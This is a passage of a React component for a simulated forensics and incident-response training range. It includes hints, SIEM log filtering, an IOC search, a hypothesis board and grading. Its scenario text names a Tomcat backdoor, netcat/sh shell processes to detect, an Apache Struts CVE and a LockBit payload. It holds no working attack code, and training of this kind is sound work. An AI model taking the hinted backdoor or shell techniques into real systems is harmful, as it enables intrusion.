      setCopilotMessages(prev => [...prev, { sender: 'aman', text: responseText }]);
    }, 800);
  };

  const requestCopilotHint = () => {
    let hintText = '';
    switch (guidanceLevel) {
      case 'beginner':
        hintText = 'CONCEPTUAL CLUE: Locate the Edge node prod-gateway-01 (10.0.10.15). We suspect there is a backdoor script active in Tomcat web applications directories. Command suggestion: ls';
        break;
      case 'intermediate':
        hintText = 'DIRECTIONAL CLUE: Audit the processes. Type "ps" in terminal to find suspicious command lines referencing tomcat users or spawning interactive sockets (netcat/sh).';
        break;
      case 'advanced':
        hintText = 'TOOL FOCUS: Generate a SHA-256 validation code. Execute "sha256sum cmd.jsp" inside directory targets to log secure cryptographic custody verification.';
        break;
      case 'expert':
        hintText = 'WALKTHROUGH EXCERPT: Use "block-ip 198.51.100.25" to prevent rogue exfiltration on the range, and apply deep inspection filters using "apply-waf".';
        break;
    }
    setCopilotMessages(prev => [...prev, { sender: 'aman', text: hintText, interactive: true }]);
  };

  // ============================================================================
  // LOGS SEARCH & IOC ANALYSIS
  // ============================================================================
  const filteredLogs = activeCase.logs.filter(log => {
    const matchesSearch = log.message.toLowerCase().includes(siemSearch.toLowerCase()) ||
      log.source.toLowerCase().includes(siemSearch.toLowerCase());
    const matchesCategory = siemCategoryFilter === 'ALL' || log.category === siemCategoryFilter;
    const matchesSeverity = siemSeverityFilter === 'ALL' || log.severity === siemSeverityFilter;
    return matchesSearch && matchesCategory && matchesSeverity;
  });

  const runIocScan = () => {
    if (!iocSearchText.trim()) return;
    const cleanSearch = iocSearchText.trim().toLowerCase();

    // Pivot search simulated results
    const matches: string[] = [];
    if (cleanSearch.includes('10.0.10.15') || cleanSearch.includes('prod-gateway')) {
      matches.push('IOC Match: Node verified on Range - host prod-gateway-01 (10.0.10.15). Known CVE-2017-5638 vulnerabilities active.');
    }
    if (cleanSearch.includes('lockbit') || cleanSearch.includes('exe')) {
      matches.push('IOC Match: lockbit_payload.exe hash registered under critical malware signature lists.');
    }
    if (cleanSearch.includes('tomcat') || cleanSearch.includes('guest')) {
      matches.push('IOC Match: Active session accounts correlated with unusual process spawning.');
    }

    if (matches.length === 0) {
      matches.push(`IOC search completed for "${iocSearchText}". No matches detected in active forensic logs database.`);
    }

    setIocScanResults(matches);
    addXp(15);
  };

  // ============================================================================
  // HYPOTHESIS & SCORING SUBMISSIONS
  // ============================================================================
  const createHypothesis = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newHypothesisTitle.trim()) return;

    const newHyp: Hypothesis = {
      id: `hyp-${Date.now()}`,
      title: newHypothesisTitle.trim(),
      supportingEvidence: [],
      refutingEvidence: [],
      unknowns: 'Requires further terminal execution probing.',
      conclusions: '',
      status: 'proposed'
    };

    setHypotheses(prev => [...prev, newHyp]);
    setNewHypothesisTitle('');
    addXp(20);
  };

  const deleteHypothesis = (id: string) => {
    setHypotheses(prev => prev.filter(h => h.id !== id));
  };

  const getPerformanceGrade = (scoreObj: any) => {
    const total = Object.values(scoreObj).reduce((a: any, b: any) => a + b, 0) as number;
    if (total > 200) return 'S+';
    if (total > 150) return 'S';
    if (total > 100) return 'A';
    if (total > 60) return 'B';
    return 'C';
  };

  return (
    <div className="space-y-6 pb-12 font-sans select-none text-slate-100">
      {/* =======================================================================
          TOP DASHBOARD HEADER
          ======================================================================= */}
      <div className="relative overflow-hidden rounded-3xl bg-slate-900 border border-purple-500/30 p-6 shadow-2xl">
        <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
          <div className="space-y-1">
            <div className="flex items-center gap-2">
              <span className="px-2.5 py-0.5 rounded-full bg-purple-950 text-purple-300 border border-purple-500/40 text-[10px] font-mono font-bold tracking-widest uppercase">
                PHASE 5 OPERATIONAL FORENSICS
              </span>
              <div className="flex items-center gap-1.5 text-xs text-slate-400 font-mono">
                <Clock className="w-3.5 h-3.5" />
                <span>Range Session Active</span>
              </div>
            </div>
            <h1 className="text-2xl lg:text-3xl font-bold font-mono tracking-tight text-white flex items-center gap-2">
              <ShieldAlert className="w-7 h-7 text-purple-400 animate-pulse" />
              Professional Investigation Center
            </h1>
            <p className="text-xs text-slate-300 max-w-4xl leading-relaxed">
              Stateful Digital Forensics, Incident Response (DFIR) and SOC simulator range. Formulate hypotheses, isolate compromised hosts, extract malicious IOC processes, search forensic log caches, and document verifiable evidence chains.
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2.5 bg-slate-950/80 p-3 rounded-2xl border border-slate-800">
            <div className="text-xs font-mono">
              <span className="text-slate-400">SEED: </span>
              <span className="text-purple-400 font-bold">{activeSeed}</span>
            </div>
            <button
              onClick={randomizeSeed}
              className="p-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 border border-slate-700 text-slate-300 hover:text-white transition-all cursor-pointer flex items-center gap-1 text-[11px]"
              title="Regenerate seed to dynamically randomise IPs, ports and files"
            >
              <RefreshCw className="w-3.5 h-3.5 animate-spin" />
              <span>Replay Seed</span>
            </button>
          </div>
        </div>
      </div>

      {/* =======================================================================
          DYNAMIC SIMULATION LOADER ("INVESTIGATE ANYTHING")
          ======================================================================= */}
      <div className="p-4 rounded-3xl bg-slate-900 border border-purple-500/20 space-y-3 font-mono text-xs">
        <div className="flex items-center gap-2 text-purple-400">
          <Sparkles className="w-4 h-4" />
          <span className="font-bold uppercase tracking-wider">Dynamic "Investigate Anything" Scenario Compiler</span>
        </div>
        <p className="text-[11px] text-slate-400 leading-relaxed">
          Input any security event or exploit scenario (e.g. "Credential compromise on Azure AD", "Anomalous Docker API port scanners"). AMAN will construct an isolated simulation sandbox complete with target hosts, objectives, specific forensic log traces, file registries, and terminal parameters.
        </p>
        <form onSubmit={handleCreateCustomInvestigation} className="flex gap-2">
          <input
            type="text"
            value={customPrompt}
            onChange={(e) => setCustomPrompt(e.target.value)}
            placeholder="Type your scenario, e.g. Healthcare ransomware deployment on PostgreSQL, Win Event log exfiltration..."
            className="flex-1 bg-slate-950 border border-slate-800 rounded-xl px-4 py-2 text-slate-200 placeholder-slate-600 focus:outline-hidden focus:border-purple-500"
          />
          <button
            type="submit"
            className="px-4 py-2 bg-purple-600 hover:bg-purple-500 text-white rounded-xl font-bold cursor-pointer hover:scale-[1.01] transition-transform"
          >
            Deploy Lab
          </button>
        </form>
      </div>

      {/* =======================================================================
          MAIN WORKSTATION GRID
          ======================================================================= */}
      <div className="grid grid-cols-1 lg:grid-cols-4 gap-6 items-start">
        {/* =====================================================================
            LEFT SIDEBAR: INCIDENT QUEUE
            ===================================================================== */}
        <div className="space-y-4">
          <div className="flex items-center justify-between px-1">
            <span className="font-mono text-xs font-bold text-slate-400 uppercase tracking-widest">
              Active Range Queue ({cases.length})
            </span>
          </div>

          <div className="space-y-2 max-h-[600px] overflow-y-auto custom-scrollbar pr-1">
            {cases.map((c) => {
              const isActive = c.id === activeCaseId;
              const severityColors = {
                LOW: 'bg-blue-950/40 text-blue-300 border-blue-500/30',
                MEDIUM: 'bg-amber-950/40 text-amber-300 border-amber-500/30',
                HIGH: 'bg-rose-950/40 text-rose-300 border-rose-500/30',
                CRITICAL: 'bg-red-950/40 text-red-300 border-red-500/50 animate-pulse'
              };

              return (
                <button
                  key={c.id}
                  onClick={() => {
                    setActiveCaseId(c.id);
                    setActiveTab('overview');
                  }}
                  className={`w-full text-left p-4 rounded-2xl border transition-all cursor-pointer ${
                    isActive
                      ? 'bg-slate-900 border-purple-500/60 shadow-lg shadow-purple-500/5'
                      : 'bg-slate-950 hover:bg-slate-900/60 border-slate-800/80 hover:border-slate-700/60'
                  }`}
                >
                  <div className="flex justify-between items-start gap-2">
                    <span className="font-mono text-[10px] text-slate-500 font-bold tracking-widest uppercase">
                      {c.id}
                    </span>
                    <span className={`px-2 py-0.5 rounded border text-[9px] font-mono font-bold uppercase ${severityColors[c.severity]}`}>
                      {c.severity}
                    </span>
                  </div>

                  <h3 className="font-mono text-xs font-bold text-slate-200 mt-2 line-clamp-1">
                    {c.title}
                  </h3>

                  <div className="flex items-center justify-between text-[10px] text-slate-400 font-mono mt-3">
                    <span>{c.organization}</span>
                    <span className="text-purple-400 font-bold">{c.progress}% investigated</span>
                  </div>

                  {/* Micro Progress Bar */}
                  <div className="w-full bg-slate-950 h-1.5 rounded-full mt-2 overflow-hidden border border-slate-900">
                    <div
                      className="bg-purple-500 h-full transition-all duration-500"
                      style={{ width: `${c.progress}%` }}
                    />
                  </div>
                </button>
              );
            })}
          </div>
        </div>

        {/* =====================================================================
            CENTER WORKSPACE: SIMULATION WORKSPACE & TABS
            ===================================================================== */}
        <div className="lg:col-span-2 space-y-6">
          {/* Workstation Workspace Navigation Tabs */}
          <div className="flex flex-wrap gap-1 bg-slate-900 p-1.5 rounded-2xl border border-slate-800 max-h-[140px] overflow-y-auto">
            {[
              { id: 'overview', name: 'Overview', icon: BookOpen },
              { id: 'network', name: 'Network Map', icon: Network },
              { id: 'hosts', name: 'Hosts & Proc', icon: Cpu },
              { id: 'logs', name: 'SIEM Logs', icon: Search },
              { id: 'files', name: 'File Integrity', icon: Database },
              { id: 'evidence', name: 'Evidence Locker', icon: Lock },
              { id: 'hypothesis', name: 'Hypothesis Board', icon: ShieldCheck },
              { id: 'report', name: 'Report & Grade', icon: FileText }
            ].map(tab => {
              const active = activeTab === tab.id;
              const Icon = tab.icon;
              return (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id)}
                  className={`flex items-center gap-1 px-3 py-1.5 rounded-xl font-mono text-[10px] font-bold uppercase cursor-pointer transition-colors ${
                    active ? 'bg-purple-600 text-white shadow-md' : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800'
                  }`}
                >
                  <Icon className="w-3.5 h-3.5" />
                  <span>{tab.name}</span>
                </button>
              );
            })}
          </div>

          {/* ===================================================================
              TAB INTERFACES
              =================================================================== */}

          {/* OVERVIEW TAB */}
          {activeTab === 'overview' && (
            <div className="bg-slate-900 rounded-3xl border border-slate-800 p-6 space-y-6">
              <div className="space-y-2">
                <span className="font-mono text-[10px] font-bold text-slate-500 tracking-wider">INCIDENT OVERVIEW BRIEF</span>
                <p className="text-sm text-slate-200 leading-relaxed font-mono">
                  {activeCase.brief}
                </p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2">
                <div className="bg-slate-950 p-4 rounded-2xl border border-slate-800/80 space-y-2.5">
                  <span className="font-mono text-[10px] text-emerald-400 font-bold uppercase tracking-wider flex items-center gap-1">
                    <CheckCircle className="w-3.5 h-3.5" />
                    Known Facts
                  </span>
                  <ul className="space-y-1.5 text-xs text-slate-300 font-mono list-disc list-inside">
                    {activeCase.knowns.map((k, idx) => (
                      <li key={idx} className="leading-relaxed">{k}</li>
                    ))}
                  </ul>
                </div>

                <div className="bg-slate-950 p-4 rounded-2xl border border-slate-800/80 space-y-2.5">
                  <span className="font-mono text-[10px] text-amber-400 font-bold uppercase tracking-wider flex items-center gap-1">
                    <AlertTriangle className="w-3.5 h-3.5" />
                    Pending Unknowns
                  </span>
                  <ul className="space-y-1.5 text-xs text-slate-300 font-mono list-disc list-inside">
                    {activeCase.unknowns.map((u, idx) => (
                      <li key={idx} className="leading-relaxed">{u}</li>
                    ))}
                  </ul>
                </div>
              </div>

              {/* Range Objectives */}
              <div className="space-y-3 pt-2">
                <span className="font-mono text-[10px] font-bold text-slate-500 tracking-wider">SIMULATED RANGE OBJECTIVES</span>
                <div className="space-y-2">
                  {activeCase.objectives.map(obj => (
                    <div
                      key={obj.id}
                      className="flex items-center justify-between p-3 rounded-xl bg-slate-950 border border-slate-800/60 font-mono text-xs"
                    >
                      <div className="flex items-center gap-2.5 text-slate-200">
                        <div className={`w-2 h-2 rounded-full ${obj.done ? 'bg-emerald-400' : 'bg-rose-500'}`} />
                        <span className={obj.done ? 'line-through text-slate-500' : ''}>{obj.desc}</span>
                      </div>
                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded uppercase ${
                        obj.done ? 'bg-emerald-950 text-emerald-300' : 'bg-slate-900 text-slate-500'
                      }`}>
                        {obj.done ? 'Verified' : 'Pending'}
                      </span>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* NETWORK TAB */}
          {activeTab === 'network' && (
            <div className="bg-slate-900 rounded-3xl border border-slate-800 p-6 space-y-6 font-mono text-xs">
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-bold text-slate-500 tracking-wider">SIMULATED TARGET CLUSTER ENVIRONMENT</span>
                <span className="text-purple-400 font-bold">Progressive Discovery Active</span>
              </div>

              {/* Dynamic Host Network Node Cards */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {activeCase.nodes.map(node => {
                  const isIsolated = isolatedHosts.includes(node.name);
                  return (
                    <div
                      key={node.id}
                      className={`p-4 rounded-2xl border bg-slate-950 flex flex-col justify-between gap-3 ${
                        isIsolated ? 'border-rose-500/40 opacity-70' : 'border-slate-800'
                      }`}
                    >
                      <div className="space-y-1">
                        <div className="flex items-center justify-between">
                          <h4 className="text-slate-100 font-bold">{node.name}</h4>
                          <span className={`px-2 py-0.5 rounded text-[9px] font-bold ${
                            isIsolated ? 'bg-rose-950 text-rose-300' : 'bg-emerald-950 text-emerald-300'
                          }`}>
                            {isIsolated ? 'ISOLATED' : node.status}
                          </span>
                        </div>
                        <p className="text-[10px] text-slate-400">{node.role} • {node.os}</p>
                        <p className="text-[11px] text-purple-400 font-bold">{node.ip}</p>
                      </div>

                      <div className="border-t border-slate-800 pt-2 space-y-1">
                        <p className="text-[9px] text-slate-500 font-bold">OPEN PORTS & SERVICE DEPLOYMENTS:</p>
                        <div className="flex flex-wrap gap-1">
                          {node.ports.map((port, idx) => (
                            <span key={idx} className="px-1.5 py-0.5 bg-slate-900 border border-slate-800 rounded text-[9px] text-slate-300">
                              {port} ({node.services[idx]})
                            </span>
                          ))}
                        </div>
                      </div>

                      {/* Action trigger to append evidence */}
                      <button
                        onClick={() => lockEvidence(node.ip, `Found open network ports: ${node.ports.join(', ')} on ${node.name}`, 'T1046')}
                        className="w-full py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 border border-slate-800 text-[10px] text-slate-300 hover:text-white transition-colors cursor-pointer"
                      >
                        Capture Node Artifact
                      </button>
                    </div>
                  );
                })}
              </div>
            </div>
          )}

          {/* HOSTS & PROCESSES TAB */}
          {activeTab === 'hosts' && (
            <div className="bg-slate-900 rounded-3xl border border-slate-800 p-6 space-y-6 font-mono text-xs">
              <span className="text-[10px] font-bold text-slate-500 tracking-wider uppercase block">
                Active Process Tree Monitor (EDR Emulator)
              </span>

              <div className="space-y-3.5 max-h-[400px] overflow-y-auto custom-scrollbar">
                {activeCase.processes.map(p => (
                  <div
                    key={p.pid}
                    className={`p-3.5 rounded-2xl border bg-slate-950 space-y-2 transition-all ${
                      p.suspicious ? 'border-rose-500/40 shadow-md shadow-rose-500/5' : 'border-slate-800'
                    }`}
                  >
                    <div className="flex justify-between items-start gap-2">
                      <div>
                        <div className="flex items-center gap-2">
                          <span className="font-bold text-slate-200">{p.name}</span>
                          <span className="text-[10px] text-slate-500">PID: {p.pid} • PPID: {p.ppid}</span>
                        </div>
                        <p className="text-[10px] text-slate-400 mt-1">{p.path}</p>
                      </div>

                      <span className={`px-2 py-0.5 rounded text-[9px] font-bold ${
                        p.suspicious ? 'bg-rose-950 text-rose-300 border border-rose-500/30' : 'bg-slate-900 text-slate-500'
                      }`}>
                        {p.suspicious ? 'MALICIOUS_INDICATOR' : 'TRUSTED'}
                      </span>
                    </div>

                    {p.args && (
                      <p className="p-2 rounded bg-slate-900 text-amber-300 font-mono text-[10px] break-all border border-slate-800">
                        {p.args}
                      </p>
                    )}

                    {p.suspicious && (
                      <div className="flex justify-end pt-1">
                        <button
                          onClick={() => lockEvidence(p.pid, `Malicious running process identified: ${p.name} with args ${p.args || 'None'}`, 'T1059')}
                          className="px-2.5 py-1 rounded bg-rose-950 hover:bg-rose-900 text-rose-300 text-[10px] font-bold border border-rose-500/30 cursor-pointer"
                        >
                          Lock Process Artifact
                        </button>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* SIEM LOGS TAB */}
          {activeTab === 'logs' && (
            <div className="bg-slate-900 rounded-3xl border border-slate-800 p-6 space-y-6 font-mono text-xs">
              <div className="flex flex-col md:flex-row gap-3">
                <div className="flex-1 relative">
                  <Search className="w-4 h-4 text-slate-500 absolute left-3.5 top-2.5" />
                  <input
                    type="text"
                    value={siemSearch}
                    onChange={(e) => setSiemSearch(e.target.value)}
                    placeholder="Filter SIEM logs by message or source IP..."
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl pl-9 pr-4 py-2 text-slate-200 placeholder-slate-600 focus:outline-hidden focus:border-purple-500"
                  />
                </div>

                <div className="flex gap-2">
                  <select
                    value={siemCategoryFilter}
                    onChange={(e) => setSiemCategoryFilter(e.target.value)}
                    className="bg-slate-950 border border-slate-800 rounded-xl px-3 py-1.5 text-slate-300"
                  >
                    <option value="ALL">ALL CATEGORIES</option>
                    <option value="AUTH">AUTH</option>
                    <option value="NETWORK">NETWORK</option>
                    <option value="PROCESS">PROCESS</option>
                    <option value="WEB">WEB</option>
                    <option value="SYSTEM">SYSTEM</option>
                  </select>

                  <select
                    value={siemSeverityFilter}
                    onChange={(e) => setSiemSeverityFilter(e.target.value)}
                    className="bg-slate-950 border border-slate-800 rounded-xl px-3 py-1.5 text-slate-300"
                  >
                    <option value="ALL">ALL SEVERITIES</option>
                    <option value="INFO">INFO</option>
                    <option value="WARNING">WARNING</option>
                    <option value="CRITICAL">CRITICAL</option>
                  </select>
                </div>
              </div>

              {/* Logs Table */}
              <div className="space-y-2 max-h-[350px] overflow-y-auto custom-scrollbar">
                {filteredLogs.map(log => {
                  const severityColors = {
                    INFO: 'bg-blue-950/20 text-blue-400',
                    WARNING: 'bg-amber-950/40 text-amber-400 border border-amber-500/20',
                    CRITICAL: 'bg-rose-950/40 text-rose-400 border border-rose-500/30'
                  };

                  return (
                    <div
                      key={log.id}
                      className="p-3 bg-slate-950 rounded-xl border border-slate-800/60 flex flex-col md:flex-row justify-between gap-3 items-start"
                    >
                      <div className="space-y-1.5">
                        <div className="flex flex-wrap items-center gap-2">
                          <span className={`px-2 py-0.5 rounded text-[8px] font-bold uppercase ${severityColors[log.severity]}`}>
                            {log.severity}
                          </span>
                          <span className="text-[10px] text-slate-500">{log.timestamp}</span>
                          <span className="text-slate-400 font-bold">{log.source}</span>
                          <span className="text-purple-400 font-bold">[{log.category}]</span>
                        </div>
                        <p className="text-slate-200 leading-relaxed text-[11px]">{log.message}</p>
                      </div>

                      <button
                        onClick={() => lockEvidence(log.id, `Incident log alert: ${log.message}`, log.mitre)}
                        className="p-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 border border-slate-800 text-[10px] text-slate-400 hover:text-white shrink-0 cursor-pointer"
                        title="Lock log entry as evidence"
                      >
                        <Lock className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  );
                })}
              </div>

              {/* Simulated IOC Search pivot */}
              <div className="bg-slate-950 p-4 rounded-2xl border border-slate-800/80 space-y-3">
                <span className="text-[10px] font-bold text-slate-500 tracking-wider block">INTELLIGENCE INDICATOR (IOC) QUICK PROBE</span>
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={iocSearchText}
                    onChange={(e) => setIocSearchText(e.target.value)}
                    placeholder="Enter suspect IP, file hash, or domain..."
                    className="flex-1 bg-slate-900 border border-slate-800 rounded-xl px-3 py-1.5 text-slate-200 placeholder-slate-600 text-xs"
                  />
                  <button
                    type="button"
                    onClick={runIocScan}
                    className="px-3.5 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-xl font-bold cursor-pointer border border-slate-700"
                  >
                    Pivot Probe
                  </button>
                </div>

                {iocScanResults.length > 0 && (
                  <div className="p-3 rounded-lg bg-slate-900 border border-slate-800 space-y-1">
                    {iocScanResults.map((res, idx) => (
                      <p key={idx} className="text-amber-400 text-[10px] leading-relaxed">{res}</p>
                    ))}
                  </div>
                )}
              </div>
            </div>
          )}

          {/* FILE INTEGRITY TAB */}
          {activeTab === 'files' && (
            <div className="bg-slate-900 rounded-3xl border border-slate-800 p-6 space-y-6 font-mono text-xs">
              <span className="text-[10px] font-bold text-slate-500 tracking-wider block">SANDBOX LOCAL FILE INTEGRITY DATABASE</span>

              <div className="space-y-3 max-h-[350px] overflow-y-auto custom-scrollbar">
                {activeCase.files.map((file, idx) => (
                  <div key={idx} className="p-3.5 bg-slate-950 rounded-2xl border border-slate-800/80 space-y-2">
                    <div className="flex justify-between items-start gap-2">
                      <div>
                        <span className="text-[10px] text-purple-400 font-bold">{file.path}</span>
                        <h4 className="font-bold text-slate-200 text-xs mt-0.5">{file.name}</h4>
                      </div>
                      <span className="text-[10px] text-slate-500 font-bold">{file.size}</span>
                    </div>

                    <div className="p-2.5 rounded bg-slate-900 font-mono text-[10px] text-slate-400 break-all border border-slate-800">
                      {file.content}
                    </div>

                    <div className="flex justify-between items-center text-[10px] text-slate-500 pt-1">
                      <span>SHA-256: {file.hash.slice(0, 20)}...</span>
                      <button
                        onClick={() => lockEvidence(file.name, `Suspect backdoor script: ${file.name} with hash ${file.hash}`, 'T1505')}
                        className="px-2.5 py-1 rounded bg-slate-900 hover:bg-slate-800 text-slate-300 text-[10px] font-bold border border-slate-800 cursor-pointer"
                      >
                        Lock Hash Custody
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* EVIDENCE LOCKER TAB */}
          {activeTab === 'evidence' && (
            <div className="bg-slate-900 rounded-3xl border border-slate-800 p-6 space-y-6 font-mono text-xs">
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-bold text-slate-500 tracking-wider">EVIDENCE LOCKER - CHAIN OF CUSTODY</span>
                <span className="text-emerald-400 font-bold">Verifiable Cryptostore Active</span>
              </div>

              {(!evidenceLocker[activeCaseId] || evidenceLocker[activeCaseId].length === 0) ? (
                <div className="p-6 bg-slate-950 rounded-2xl border border-slate-800/60 text-center space-y-2">
                  <Lock className="w-8 h-8 text-slate-600 mx-auto" />
                  <p className="text-slate-400">Locker is empty. Run terminal commands or probe logs to flag evidence.</p>
                </div>
              ) : (
                <div className="space-y-3.5 max-h-[400px] overflow-y-auto custom-scrollbar">
                  {evidenceLocker[activeCaseId].map((item) => (
                    <div key={item.id} className="p-3.5 bg-slate-950 rounded-2xl border border-slate-800/80 space-y-2">
                      <div className="flex justify-between items-start">
                        <div>
                          <span className="text-[10px] text-purple-400 font-bold uppercase tracking-wider">{item.id}</span>
                          <h4 className="font-bold text-slate-200 mt-0.5">{item.description}</h4>
                        </div>
                        <span className="px-2 py-0.5 rounded bg-emerald-950 text-emerald-300 text-[8px] font-bold">SHA-256 MATCH</span>
                      </div>

                      <p className="text-[10px] text-slate-400">Artifact payload: <span className="text-slate-300 font-bold">{item.artifact}</span></p>
                      <p className="text-[9px] text-slate-500 break-all leading-relaxed">Cryptographic hash: {item.hash}</p>

                      <div className="flex justify-between items-center text-[10px] text-slate-400 pt-1.5 border-t border-slate-900">
                        <span>MITRE: {item.mitre || 'T1190'}</span>
                        <button
                          onClick={() => {
                            // simple delete
                            const updatedCaseEvid = (evidenceLocker[activeCaseId] || []).filter(e => e.id !== item.id);
                            setEvidenceLocker({
                              ...evidenceLocker,
                              [activeCaseId]: updatedCaseEvid
                            });
                          }}
                          className="text-[10px] text-rose-400 hover:text-rose-300 cursor-pointer"
                        >
                          Unlock Artifact
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* HYPOTHESIS TAB */}
          {activeTab === 'hypothesis' && (
            <div className="bg-slate-900 rounded-3xl border border-slate-800 p-6 space-y-6 font-mono text-xs">
              <span className="text-[10px] font-bold text-slate-500 tracking-wider block">SOCRATIC METHOD: HYPOTHESIS MONITOR BOARD</span>

              <form onSubmit={createHypothesis} className="flex gap-2">
                <input
                  type="text"
                  value={newHypothesisTitle}
                  onChange={(e) => setNewHypothesisTitle(e.target.value)}
                  placeholder="E.g., Suspected access key exfil occurred via Git runner pipeline..."
                  className="flex-1 bg-slate-950 border border-slate-800 rounded-xl px-3 py-1.5 text-xs text-slate-200 placeholder-slate-600 focus:outline-hidden"
                />
                <button
                  type="submit"
                  className="px-4 py-1.5 bg-purple-600 hover:bg-purple-500 text-white rounded-xl font-bold cursor-pointer"
                >
                  Propose
                </button>
              </form>

              <div className="space-y-3.5 max-h-[350px] overflow-y-auto custom-scrollbar">
                {hypotheses.map(hyp => (
                  <div key={hyp.id} className="p-4 bg-slate-950 rounded-2xl border border-slate-800/80 space-y-2">
                    <div className="flex justify-between items-start gap-2">
                      <h4 className="font-bold text-slate-200 leading-relaxed text-xs">{hyp.title}</h4>
                      <button onClick={() => deleteHypothesis(hyp.id)} className="text-slate-500 hover:text-rose-400 cursor-pointer">
                        <Trash2 className="w-3.5 h-3.5" />
                      </button>
                    </div>

                    <div className="text-[10px] text-slate-400 space-y-1">
                      <p>• Supporting Evidence: <span className="text-slate-300 font-bold">{hyp.supportingEvidence.length || 'None locked yet'}</span></p>
                      <p>• Pending Unknowns: <span className="text-amber-400">{hyp.unknowns}</span></p>
                    </div>

                    <div className="flex gap-2 pt-2">
                      <button
                        onClick={() => {
                          const updated = hypotheses.map(h => h.id === hyp.id ? { ...h, status: 'validated' as const } : h);
                          setHypotheses(updated);
                          addXp(30);
                        }}
                        className="px-2.5 py-1 bg-emerald-950 text-emerald-300 hover:bg-emerald-900 rounded text-[10px] font-bold border border-emerald-500/20 cursor-pointer"
                      >
                        Validate Hypothesis
                      </button>
                      <button
                        onClick={() => {
                          const updated = hypotheses.map(h => h.id === hyp.id ? { ...h, status: 'refuted' as const } : h);
                          setHypotheses(updated);
                        }}
                        className="px-2.5 py-1 bg-rose-950 text-rose-300 hover:bg-rose-900 rounded text-[10px] font-bold border border-rose-500/20 cursor-pointer"
                      >
                        Refute Hypothesis
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* REPORT & GRADE TAB */}
          {activeTab === 'report' && (
            <div className="bg-slate-900 rounded-3xl border border-slate-800 p-6 space-y-6 font-mono text-xs">
              <div className="flex items-center justify-between border-b border-slate-800 pb-3">
                <span className="text-[10px] font-bold text-slate-500 tracking-wider">MANDATED FORMAL INCIDENT REPORT</span>
                <span className="text-2xl font-bold text-purple-400">{getPerformanceGrade(activeCase.score)} Grade</span>
              </div>

              {/* Scorecard domains */}
              <div className="grid grid-cols-2 md:grid-cols-3 gap-3.5">
                {[
                  { name: 'Reconnaissance', score: activeCase.score.recon },
                  { name: 'Evidence Quality', score: activeCase.score.evidence },
                  { name: 'Hypothesis Verification', score: activeCase.score.hypothesis },
                  { name: 'Technical Execution', score: activeCase.score.execution },
                  { name: 'MITRE Mapping', score: activeCase.score.mitre },
                  { name: 'Operational OpSec', score: activeCase.score.opSec }
                ].map((item, idx) => (
                  <div key={idx} className="bg-slate-950 p-3 rounded-2xl border border-slate-800">
                    <p className="text-[10px] text-slate-500 font-bold uppercase">{item.name}</p>
                    <p className="text-base font-bold text-slate-200 mt-1">{item.score} / 100</p>
                  </div>
                ))}
              </div>

              {/* Draft Report input note */}
              <div className="space-y-2.5">
                <span className="text-[10px] font-bold text-slate-500 tracking-wider">FORENSIC ANALYSIS NOTES & REMEDIATION MANDATE</span>
                <textarea
                  value={customNotes}
                  onChange={(e) => setCustomNotes(e.target.value)}
                  placeholder="Enter analyst notes: Identify patient database target logs, confirm Apache Struts vector compromise, outline mitigation plans..."
                  className="w-full bg-slate-950 border border-slate-800 rounded-2xl p-4 text-xs text-slate-200 placeholder-slate-600 focus:outline-hidden min-h-[140px]"
                />
              </div>

              <div className="flex gap-2">
                <button
                  type="button"
                  onClick={() => {
                    addNotebookNote({
                      title: `[FORENSIC DEBRIEF] ${activeCase.title}`,
                      content: `Case: ${activeCase.id}\nGrade: ${getPerformanceGrade(activeCase.score)}\nNotes: ${customNotes}`,
                      category: 'Cases',
                      tags: ['Forensics', 'Investigation Center', 'Incident Response']
                    });
                    addXp(150);
                    alert('Incident report successfully compiled and integrated into study binder!');
                  }}
                  className="flex-1 py-2 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-bold cursor-pointer text-center text-xs"
                >
                  Compile Final Incident Report
                </button>
              </div>
            </div>
          )}
        </div>

        {/* =====================================================================
            RIGHT SIDEBAR: AMAN FORENSIC COPILOT
            ===================================================================== */}
        <div className="space-y-4">
          <div className="p-5 rounded-3xl bg-slate-900 border border-purple-500/20 space-y-4">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div className="flex items-center gap-2">
                <Cpu className="w-5 h-5 text-purple-400 animate-pulse" />
                <div>
                  <h3 className="font-mono text-xs font-bold text-white uppercase tracking-wider">AMAN Socratic Mentor</h3>
                  <span className="text-[10px] text-emerald-400 font-mono">ONLINE ● AGENT 6.0</span>
                </div>
              </div>

              <select
                value={guidanceLevel}
                onChange={(e: any) => setGuidanceLevel(e.target.value)}
                className="bg-slate-950 border border-slate-800 rounded-lg px-2 py-1 text-[10px] font-mono text-purple-300 focus:outline-hidden"
              >
                <option value="beginner">Beginner</option>
                <option value="intermediate">Intermediate</option>
                <option value="advanced">Advanced</option>
                <option value="expert">Expert</option>
              </select>
            </div>

            {/* Socratic Messages thread */}
            <div className="space-y-3 max-h-[300px] overflow-y-auto custom-scrollbar font-mono text-[11px] leading-relaxed">
              {copilotMessages.map((msg, idx) => (
                <div
                  key={idx}
                  className={`p-3 rounded-2xl border ${
                    msg.sender === 'aman'
                      ? 'bg-slate-950/90 border-purple-500/10 text-purple-200'
                      : 'bg-purple-950/20 border-purple-500/20 text-slate-100'
                  }`}
                >
                  <p>{msg.text}</p>
                </div>
              ))}
            </div>

